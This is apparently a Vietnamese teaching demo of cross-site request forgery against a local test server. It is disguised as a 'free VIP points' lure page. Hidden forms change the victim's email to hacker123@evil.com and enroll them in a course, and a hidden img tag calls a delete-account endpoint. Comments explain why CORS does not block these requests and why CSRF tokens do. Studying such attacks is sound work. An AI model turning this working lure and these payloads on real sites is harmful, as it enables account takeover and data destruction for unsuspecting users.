<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>🎁 Khóa học MIỄN PHÍ - Nhận ngay!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            background: white;
            color: #333;
            padding: 40px;
            border-radius: 10px;
            max-width: 650px;
            margin: 0 auto;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        }
        button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px;
            width: 100%;
        }
        button:hover { background: #45a049; }
        .note {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 5px;
            padding: 10px;
            margin: 10px 0;
            color: #856404;
            font-size: 13px;
            text-align: left;
        }
        .debug {
            margin-top: 20px;
            padding: 15px;
            background: #f0f0f0;
            border-radius: 5px;
            text-align: left;
            font-size: 12px;
            max-height: 300px;
            overflow-y: auto;
        }

        .hidden-forms { display: none; }
    </style>
</head>
<body>
<div class="container">
    <h1>🎉 Chúc mừng!</h1>
    <h2>Bạn được chọn nhận 1000 điểm MIỄN PHÍ</h2>
    <p>Nhấn nút bên dưới để kích hoạt tài khoản VIP của bạn!</p>

    <div class="note">
        ℹ️ <strong>Ghi chú kỹ thuật:</strong> Các attack dưới đây dùng <code>form submit</code>
        — <strong>không có Preflight</strong>, browser gửi thẳng kèm cookie,
        CORS <strong>không chặn được</strong>. Chỉ CSRF token mới chặn được!
    </div>

    <button onclick="attack1()">🎁 Thay đổi Email (form submit)</button>
    <button onclick="attack2()">📚 Đăng ký khóa học (form submit)</button>
    <button onclick="attack3()">🔥 Xóa tài khoản (img src trick)</button>

    <div id="status" style="margin-top: 20px; color: #666; font-weight: bold;"></div>
    <div id="debug" class="debug"></div>
</div>

<div class="hidden-forms">

    <!-- Form 1: Thay đổi email -->
    <form id="form-change-email"
          action="http://localhost:8080/api/user/change-email"
          method="POST"
          enctype="application/x-www-form-urlencoded"
          target="hidden-iframe-1">
        <input type="hidden" name="newEmail" value="hacker123@evil.com">
    </form>

    <form id="form-enroll"
          action="http://localhost:8080/api/user/enroll-course"
          method="POST"
          enctype="application/x-www-form-urlencoded"
          target="hidden-iframe-2">
        <input type="hidden" name="courseId" value="999">
    </form>

    <iframe name="hidden-iframe-1" id="iframe-1"></iframe>
    <iframe name="hidden-iframe-2" id="iframe-2"></iframe>
</div>

<script>
    const debugDiv = document.getElementById('debug');
    const statusDiv = document.getElementById('status');

    function log(message, isError = false) {
        const timestamp = new Date().toLocaleTimeString();
        const color = isError ? 'red' : '#333';
        debugDiv.innerHTML += `<div style="color: ${color};">[${timestamp}] ${message}</div>`;
        debugDiv.scrollTop = debugDiv.scrollHeight;
    }

    // Attack 1: Form submit thay đổi email
    // - Không có Preflight
    // - Browser gửi thẳng kèm cookie
    // - Content-Type: application/x-www-form-urlencoded (Simple Request)
    function attack1() {
        log('🚀 Attack1: Submit form thay đổi email');
        log('📋 Loại request: Simple Request (form submit)');
        log('🚫 Không có Preflight → CORS không chặn được!');
        log('🍪 Browser tự động gửi kèm cookie accessToken...');

        document.getElementById('form-change-email').submit();

        statusDiv.innerHTML = '📡 Form đã submit! Kiểm tra server xem email có đổi không...';

        // Đợi chút rồi kiểm tra iframe response
        setTimeout(() => {
            try {
                const iframe = document.getElementById('iframe-1');
                log(`📥 Response từ server: ${iframe.contentDocument?.body?.innerText || '(không đọc được do CORS - nhưng request đã gửi!)'}`);
            } catch(e) {
                log('📥 Không đọc được response (same-origin policy trên response) — nhưng REQUEST ĐÃ ĐƯỢC GỬI ĐI!');
                log('✅ Vào server log để xem request có đến không.');
            }
        }, 2000);
    }

    // Attack 2: Form submit đăng ký khóa học
    function attack2() {
        log('🚀 Attack2: Submit form đăng ký khóa học');
        log('📋 Loại request: Simple Request (form submit)');
        log('🚫 Không có Preflight → CORS không chặn được!');

        document.getElementById('form-enroll').submit();

        statusDiv.innerHTML = '📡 Form đã submit! Kiểm tra server log...';

        setTimeout(() => {
            try {
                const iframe = document.getElementById('iframe-2');
                log(`📥 Response: ${iframe.contentDocument?.body?.innerText || '(không đọc được)'}`);
            } catch(e) {
                log('📥 Request đã gửi! Kiểm tra server log để xác nhận.');
            }
        }, 2000);
    }

    function attack3() {
        log('🚀 Attack3: Dùng thẻ <img> để gửi GET request');
        log('📋 Loại request: Simple GET Request');
        log('🚫 Không có Preflight → CORS không chặn được!');
        log('🍪 Cookie được gửi kèm tự động');

        const img = document.createElement('img');
        img.src = 'http://localhost:8080/api/user/delete-account';
        img.style.display = 'none';

        img.onload = () => log('✅ Request thành công! (server trả về ảnh hoặc 200)');
        img.onerror = () => log('📥 Request đã gửi đến server! (lỗi vì server không trả về ảnh — nhưng request ĐÃ ĐẾN server!)');

        document.body.appendChild(img);
        statusDiv.innerHTML = '📡 GET request đã gửi qua thẻ img!';
    }

    log(`🍪 Cookies đọc được từ trang này: ${document.cookie || '(rỗng — httpOnly cookies không đọc được bằng JS, nhưng vẫn được gửi kèm request!)'}`);
    log('');
    log('📌 Sự khác biệt với fetch + JSON:');
    log('   fetch + JSON → có Preflight OPTIONS → CORS chặn được');
    log('   form submit  → KHÔNG có Preflight  → CORS KHÔNG chặn được');
    log('   img src      → KHÔNG có Preflight  → CORS KHÔNG chặn được');
    log('');
    log('👉 Chỉ CSRF Token mới chặn được form submit attack!');
</script>
</body>
</html>
